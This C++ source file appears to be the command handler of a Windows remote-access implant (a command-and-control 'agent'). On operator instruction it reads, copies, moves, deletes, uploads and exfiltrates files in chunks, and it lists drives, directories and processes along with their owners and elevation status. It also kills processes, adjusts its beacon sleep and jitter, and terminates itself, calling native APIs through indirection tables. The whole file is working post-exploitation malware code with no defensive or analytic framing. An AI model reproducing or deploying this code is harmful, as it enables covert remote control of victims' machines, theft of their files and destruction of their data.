#include "Commander.h"

Commander::Commander(Agent* a)
{
	this->agent = a;
}

void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacker)
{
	if (recvSize < 8)
		return;

	Packer* inPacker  = (Packer*)MemAllocLocal(sizeof(Packer));
	*inPacker = Packer( recv, recvSize );

	ULONG packerSize = inPacker->Unpack32();
	while ( packerSize + 4 > inPacker->GetDataSize())
	{	
		ULONG CommandId = inPacker->Unpack32();
		switch ( CommandId )
		{
		case COMMAND_CAT:
			this->CmdCat(CommandId, inPacker, outPacker); break;
		
		case COMMAND_CD:        
			this->CmdCd(CommandId, inPacker, outPacker); break;
	
		case COMMAND_CP:   
			this->CmdCp(CommandId, inPacker, outPacker); break;

		case COMMAND_DISKS:
			this->CmdDisks(CommandId, inPacker, outPacker); break;

		case COMMAND_DOWNLOAD:
			this->CmdDownload(CommandId, inPacker, outPacker); break;

		case COMMAND_DOWNLOAD_STATE:
			this->CmdDownloadState(CommandId, inPacker, outPacker); break;

		case COMMAND_LS:
			this->CmdLs(CommandId, inPacker, outPacker); break;

		case COMMAND_MV:
			this->CmdMv(CommandId, inPacker, outPacker); break;

		case COMMAND_MKDIR:
			this->CmdMkdir(CommandId, inPacker, outPacker); break;

		case COMMAND_PROFILE:
			this->CmdProfile(CommandId, inPacker, outPacker); break;

		case COMMAND_PS_LIST:
			this->CmdPsList(CommandId, inPacker, outPacker); break;

		case COMMAND_PS_KILL:
			this->CmdPsKill(CommandId, inPacker, outPacker); break;

		case COMMAND_PWD:       
			this->CmdPwd(CommandId, inPacker, outPacker); break;

		case COMMAND_RM:
			this->CmdRm(CommandId, inPacker, outPacker); break;

		case COMMAND_TERMINATE: 
			this->CmdTerminate(CommandId, inPacker, outPacker); break;
		
		case COMMAND_UPLOAD:
			this->CmdUpload(CommandId, inPacker, outPacker); break;

		case COMMAND_SAVEMEMORY:
			this->CmdSaveMemory(CommandId, inPacker, outPacker); break;

		default: break;
		}
	}

	MemFreeLocal((LPVOID*)&recv, recvSize);
}

void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
	if ((!hFile) || (hFile == INVALID_HANDLE_VALUE)) {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);

		if (hFile) {
			ApiNt->NtClose(hFile);
			hFile = NULL;
		}
		return;
	}

	DWORD contentSize = 2048;
	DWORD readed = 0;
	PVOID content = MemAllocLocal(contentSize);

	bool result = ApiWin->ReadFile(hFile, content, contentSize, &readed, NULL);
	if (result) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
		outPacker->PackBytes((PBYTE)content, readed);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}

	if (hFile) {
		ApiNt->NtClose(hFile);
		hFile = NULL;
	}

	if (content)
		MemFreeLocal(&content, contentSize);
}

void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*) inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->SetCurrentDirectoryA(path);
	if (result) {
		CHAR  currentPath[MAX_PATH] = { 0 };
		ULONG currentPathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, currentPath);
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)currentPath, currentPathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG srcSize = 0;
	CHAR* src     = (CHAR*) inPacker->UnpackBytes(&srcSize);
	ULONG dstSize = 0;
	CHAR* dst     = (CHAR*) inPacker->UnpackBytes(&dstSize);
	ULONG taskId  = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->CopyFileA(src, dst, FALSE);
	if (result) {
		outPacker->Pack32(commandId);
	}      
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

void Commander::CmdDisks(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG taskId = inPacker->Unpack32();
	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);

	ULONG drives = ApiWin->GetLogicalDrives();
	if (drives == 0) {
		outPacker->Pack8(FALSE);
		outPacker->Pack32(TEB->LastErrorValue);
	}
	else {
		outPacker->Pack8(TRUE);
		
		ULONG count = 0;
		ULONG indexCount = outPacker->GetDataSize();
		outPacker->Pack32(0);

		for (char drive = 'A'; drive <= 'Z'; ++drive) {
			if (drives & (1 << (drive - 'A'))) {
				char drivePath[] = { drive, ':', '\\', '\0' };
				ULONG driveType = ApiWin->GetDriveTypeA(drivePath);

				outPacker->Pack8(drive);
				outPacker->Pack32(driveType);

				count++;
			}
		}
		outPacker->Set32(indexCount, count);
	}
}

void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG filenameSize = 0;
	CHAR* filename     = (CHAR*) inPacker->UnpackBytes(&filenameSize);
	ULONG taskId       = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	HANDLE hFile = ApiWin->CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
	else {
		CHAR  fullPath[MAX_PATH];
		DWORD pathSize = ApiWin->GetFullPathNameA( filename, MAX_PATH, fullPath, NULL);
		DWORD fileSize = ApiWin->GetFileSize( hFile, 0 );

		if (pathSize > 0) {
			DownloadData downloadData = this->agent->downloader->CreateDownloadData(taskId, hFile, fileSize);
			outPacker->Pack32(COMMAND_DOWNLOAD);
			outPacker->Pack32(downloadData.fileId);
			outPacker->Pack8(DOWNLOAD_START);
			outPacker->Pack32(downloadData.fileSize);
			outPacker->PackBytes((PBYTE)fullPath, pathSize);
		}
		else {
			outPacker->Pack32(COMMAND_ERROR);
			outPacker->Pack32(TEB->LastErrorValue);
		}
	}
}

void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG newState = inPacker->Unpack32();
	ULONG fileId   = inPacker->Unpack32();
	ULONG taskId   = inPacker->Unpack32();

	bool  found    = false;
	for (int i = 0; i < this->agent->downloader->downloads.size(); i++) {
		if (this->agent->downloader->downloads[i].fileId == fileId) {
			this->agent->downloader->downloads[i].state = newState;
			found = true;
			break;
		}
	}

	outPacker->Pack32(taskId);
	if (found) {
		outPacker->Pack32(COMMAND_DOWNLOAD_STATE);
		outPacker->Pack32(fileId);
		outPacker->Pack8((BYTE)newState);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(2);
	}
}

void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);

	CHAR  fullpath[MAX_PATH];
	DWORD fullpathSize = MAX_PATH;

	if (pathSize == 3 && path[1] == ':') {
		fullpath[0] = path[0];
		fullpath[1] = path[1];
		fullpathSize = 2;
	}
	else {
		fullpathSize = ApiWin->GetFullPathNameA(path, MAX_PATH, fullpath, NULL);
		if (fullpathSize + 2 > MAX_PATH || fullpathSize == 0) {
			outPacker->Pack8(FALSE);
			outPacker->Pack32(TEB->LastErrorValue);
			return;
		}
	}

	fullpath[fullpathSize]   = '\\';
	fullpath[++fullpathSize] = '*';
	fullpath[++fullpathSize] = 0;

	WIN32_FIND_DATAA findData = { 0 };
	HANDLE File = ApiWin->FindFirstFileA(fullpath, &findData);
	if ( File != INVALID_HANDLE_VALUE ) {
		outPacker->Pack8(TRUE);
		outPacker->PackStringA(fullpath);

		ULONG count = 0;
		ULONG indexCount = outPacker->GetDataSize();
		outPacker->Pack32(0);

		do {
			BOOL isDir = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY;
			
			if( isDir && StrLenA(findData.cFileName) == 1 && findData.cFileName[0] == 0x2e )
				continue;
			if (isDir && StrLenA(findData.cFileName) == 2 && findData.cFileName[0] == 0x2e && findData.cFileName[1] == 0x2e)
				continue;
			
			ULONG64 size = 0;
			((ULONG*)&size)[1] = findData.nFileSizeHigh;
			((ULONG*)&size)[0] = findData.nFileSizeLow;

			ULONG writeDate = FileTimeToUnixTimestamp(findData.ftLastWriteTime);

			outPacker->Pack8(isDir);
			outPacker->Pack64(size);
			outPacker->Pack32(writeDate);
			outPacker->PackStringA(findData.cFileName);

			count++;

		} while (ApiWin->FindNextFileA(File, &findData));
		ApiWin->FindClose(File);
		outPacker->Set32(indexCount, count);
	}
	else {
		outPacker->Pack8(FALSE);
		outPacker->Pack32(TEB->LastErrorValue);
	}

}

void Commander::CmdMkdir(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->CreateDirectoryA(path, NULL);
	if (result) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

void Commander::CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG srcSize = 0;
	CHAR* src = (CHAR*)inPacker->UnpackBytes(&srcSize);
	ULONG dstSize = 0;
	CHAR* dst = (CHAR*)inPacker->UnpackBytes(&dstSize);
	ULONG taskId = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->MoveFileA(src, dst);
	if (result) {
		outPacker->Pack32(commandId);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG subcommand = inPacker->Unpack32();

	if (subcommand == 1) {
		ULONG sleep  = inPacker->Unpack32();
		ULONG jitter = inPacker->Unpack32();
		ULONG taskId = inPacker->Unpack32();

		agent->config->sleep_delay  = sleep;
		agent->config->jitter_delay = jitter;

		outPacker->Pack32(taskId);
		outPacker->Pack32(COMMAND_PROFILE);
		outPacker->Pack32(subcommand);
		outPacker->Pack32(agent->config->sleep_delay);
		outPacker->Pack32(agent->config->jitter_delay);
	} 
	else if (subcommand == 2) {
		ULONG size   = inPacker->Unpack32();
		ULONG taskId = inPacker->Unpack32();
		
		agent->downloader->chunkSize = size;

		outPacker->Pack32(taskId);
		outPacker->Pack32(COMMAND_PROFILE);
		outPacker->Pack32(subcommand);
		outPacker->Pack32(agent->downloader->chunkSize);
	}
}

void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG taskId = inPacker->Unpack32();

	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);

	PSYSTEM_PROCESS_INFORMATION spi = NULL, spiAddr = NULL;

	ULONG spiSize = 0;
	NTSTATUS NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &spiSize);
	if (!NT_SUCCESS(NtStatus)) {
		spiSize += 0x1000;
		spi = (PSYSTEM_PROCESS_INFORMATION)MemAllocLocal(spiSize);
		if (spi)
			NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, spi, spiSize, &spiSize);
	}
	spiAddr = spi;

	if (NT_SUCCESS(NtStatus)) {
		outPacker->Pack8(TRUE);
		ULONG count = 0;
		ULONG indexCount = outPacker->GetDataSize();
		outPacker->Pack32(0);

		DWORD accessMask = 0;
		if (agent->info->major_version == 5 && agent->info->minor_version == 1)
			accessMask = PROCESS_QUERY_INFORMATION;
		else
			accessMask = PROCESS_QUERY_LIMITED_INFORMATION;

		do {
			BOOL  elevated = FALSE;
			BYTE  arch64 = 10;
			CHAR  processName[260] = { 0 };
			ULONG usernameSize = MAX_PATH;
			CHAR  username[MAX_PATH] = { 0 };
			ULONG domainSize = MAX_PATH;
			CHAR  domain[MAX_PATH] = { 0 };

			OBJECT_ATTRIBUTES ObjectAttr = { sizeof(OBJECT_ATTRIBUTES) };
			InitializeObjectAttributes(&ObjectAttr, NULL, 0, NULL, NULL);

			BOOL      result = FALSE;
			HANDLE    hToken = NULL;
			HANDLE    hProcess = NULL;
			CLIENT_ID clientId = { spi->UniqueProcessId, 0 };
			NtStatus = ApiNt->NtOpenProcess(&hProcess, accessMask, &ObjectAttr, &clientId);
			if (NT_SUCCESS(NtStatus)) {

				ULONG_PTR piWow64 = NULL;
				NtStatus = ApiNt->NtQueryInformationProcess(hProcess, ProcessWow64Information, &piWow64, sizeof(ULONG_PTR), NULL);
				if (NT_SUCCESS(NtStatus))
					arch64 = (piWow64 == 0);

				NtStatus = ApiNt->NtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
				if (NT_SUCCESS(NtStatus)) {

					if (hToken) {
						LPVOID tokenInfo = NULL;
						DWORD  tokenInfoSize = 0;
						result = ApiWin->GetTokenInformation(hToken, TokenUser, tokenInfo, 0, &tokenInfoSize);
						if (!result) {
							tokenInfo = MemAllocLocal(tokenInfoSize);
							if (tokenInfo)
								result = ApiWin->GetTokenInformation(hToken, TokenUser, tokenInfo, tokenInfoSize, &tokenInfoSize);
						}

						TOKEN_ELEVATION Elevation = { 0 };
						DWORD eleavationSize = sizeof(TOKEN_ELEVATION);
						ApiWin->GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &eleavationSize);

						if (result) {
							SID_NAME_USE SidType;
							result = ApiWin->LookupAccountSidA(NULL, ((PTOKEN_USER)tokenInfo)->User.Sid, username, &usernameSize, domain, &domainSize, &SidType);
							if (result) {
								elevated = Elevation.TokenIsElevated;
							}
						}
					}
				}
			}

			if (spi->ImageName.Buffer) {

				ConvertUnicodeStringToChar(spi->ImageName.Buffer, spi->ImageName.Length, processName, sizeof(processName));

				outPacker->Pack16((WORD)spi->UniqueProcessId);
				outPacker->Pack16((WORD)spi->InheritedFromUniqueProcessId);
				outPacker->Pack16((WORD)spi->SessionId);
				outPacker->Pack8(arch64);
				outPacker->Pack8(elevated);
				outPacker->PackStringA(domain);
				outPacker->PackStringA(username);
				outPacker->PackStringA(processName);

				count++;

				memset(processName, 0, spi->ImageName.Length / 2);
				memset(username, 0, usernameSize);
				memset(domain, 0, domainSize);
			}

			if (hProcess) {
				ApiNt->NtClose(hProcess);
				hProcess = NULL;
			}
			if (hToken) {
				ApiNt->NtClose(hToken);
				hToken = NULL;
			}

			if (!spi->NextEntryOffset)
				break;
			spi = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
		} while (TRUE);

		if (spiAddr)
			MemFreeLocal((LPVOID*)&spiAddr, spiSize);

		outPacker->Set32(indexCount, count);
	}
	else {
		outPacker->Pack8(TRUE);
		outPacker->Pack32(87);
	}
}

void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG64 pid = inPacker->Unpack32();
	ULONG taskId = inPacker->Unpack32();

	outPacker->Pack32(taskId);
	
	OBJECT_ATTRIBUTES ObjectAttr = { sizeof(OBJECT_ATTRIBUTES) };
	InitializeObjectAttributes(&ObjectAttr, NULL, 0, NULL, NULL);

	CLIENT_ID clientID = { (HANDLE)pid, 0 };
	HANDLE    hProcess = NULL;

	NTSTATUS status = ApiNt->NtOpenProcess(&hProcess, PROCESS_TERMINATE, &ObjectAttr, &clientID);
	if ( NT_SUCCESS(status) ) {
		outPacker->Pack32(commandId);
		ApiNt->NtTerminateProcess(hProcess, 0);
		outPacker->Pack32(pid);
	}
	else {
		ULONG error = ApiNt->RtlNtStatusToDosError(status);
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(error);
	}

	if (hProcess) {
		ApiNt->NtClose(hProcess);
		hProcess = NULL;
	}
}

void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	CHAR  path[MAX_PATH] = { 0 };
	ULONG pathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, path);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	if (pathSize) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

void Commander::CmdRm(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	DWORD dwAttrib = ApiWin->GetFileAttributesA(path);

	bool result = FALSE;
	bool directory = (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));

	if ( directory )
		result = ApiWin->RemoveDirectoryA(path);
	else
		result = ApiWin->DeleteFileA(path);

	if (result) {
		outPacker->Pack32(commandId);
		outPacker->Pack8(directory);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	agent->config->exit_method  = inPacker->Unpack32();
	agent->config->exit_task_id = inPacker->Unpack32();
	agent->SetActive(false);
}

void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG memoryId = inPacker->Unpack32();
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();
	
	outPacker->Pack32(taskId);

	if ( !agent->memorysaver->chunks.contains(memoryId) )
		return;

	MemoryData memData = agent->memorysaver->chunks[memoryId];
	if (memData.complete) {

		bool  result  = false;
		DWORD written = 0;

		HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			result = ApiWin->WriteFile(hFile, memData.buffer, memData.totalSize, &written, NULL);

		if (result) {
			outPacker->Pack32(COMMAND_UPLOAD);
		}
		else {
			outPacker->Pack32(COMMAND_ERROR);
			outPacker->Pack32(TEB->LastErrorValue);
		}

		if (hFile) {
			ApiNt->NtClose(hFile);
			hFile = NULL;
		}
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(2);
	}
	agent->memorysaver->RemoveMemoryData(memoryId);
}

void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG memoryId   = inPacker->Unpack32();
	ULONG totalSize  = inPacker->Unpack32();
	ULONG bufferSize = 0;
	BYTE* buffer     = inPacker->UnpackBytes(&bufferSize);
	ULONG taskId     = inPacker->Unpack32();

	this->agent->memorysaver->WriteMemoryData(memoryId, totalSize, bufferSize, buffer);
}

void Commander::Exit(Packer* outPacker)
{
	outPacker->Pack32(agent->config->exit_task_id);
	outPacker->Pack32(COMMAND_TERMINATE);
	outPacker->Pack32(agent->config->exit_method);
}